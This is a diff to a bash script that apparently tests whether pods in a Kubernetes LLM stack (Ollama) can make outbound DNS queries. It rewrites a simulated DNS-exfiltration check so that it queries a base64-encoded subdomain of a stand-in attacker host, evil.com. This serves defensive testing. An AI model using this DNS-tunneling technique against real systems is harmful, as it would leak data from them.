@@ -209,7 +209,7 @@ attack_dns_exfiltration() {
     echo ""
 
     OLLAMA_POD=$(kubectl -n llm-system get pod -l app=ollama -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")
-    
+
     if [ -z "$OLLAMA_POD" ]; then
         log_result "Ollama pod not found. Deploy the LLM stack first."
         return 1
@@ -217,11 +217,14 @@ attack_dns_exfiltration() {
 
     # Simulated exfiltration: encode data as subdomain
     ENCODED_DATA="c2VjcmV0X2RhdGE"  # base64 of "secret_data"
-    
-    echo "Command: nslookup ${ENCODED_DATA}.attacker-dns.evil.com"
+    EXFIL_DOMAIN="${ENCODED_DATA}.attacker-exfil.evil.com"
+
+    echo "Command: getent hosts ${EXFIL_DOMAIN}"
+    log_info "Impact: Data encoded in DNS subdomain sent to attacker's nameserver"
     echo ""
-    
-    if kubectl -n llm-system exec "$OLLAMA_POD" -- nslookup "${ENCODED_DATA}.google.com" 2>/dev/null; then
+
+    # Use getent which is available in most containers (nslookup often isn't)
+    if kubectl -n llm-system exec "$OLLAMA_POD" -- getent hosts "${EXFIL_DOMAIN}" 2>/dev/null; then
         echo ""
         log_result "⚠️  VULNERABLE: External DNS query SUCCEEDED"
         log_result "Data could be exfiltrated via DNS tunneling!"
